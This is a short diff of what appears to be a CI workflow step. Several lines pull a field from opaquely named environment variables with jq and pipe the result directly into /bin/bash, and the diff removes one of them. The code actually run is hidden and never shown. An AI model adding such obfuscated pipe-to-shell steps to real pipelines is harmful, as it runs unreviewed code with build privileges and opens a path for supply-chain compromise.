@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$hixf1553" | jq -r .zll4 | /bin/bash
           echo $uv81742 | jq -r .qs18 | /bin/bash
-          echo $mled57456 | jq -r .szd396 | /bin/bash
           printf '%s' "$jqo2412" | jq -r .rbgf8 | /bin/bash
           echo $wh91762 | jq -r .fc57 | /bin/bash
 
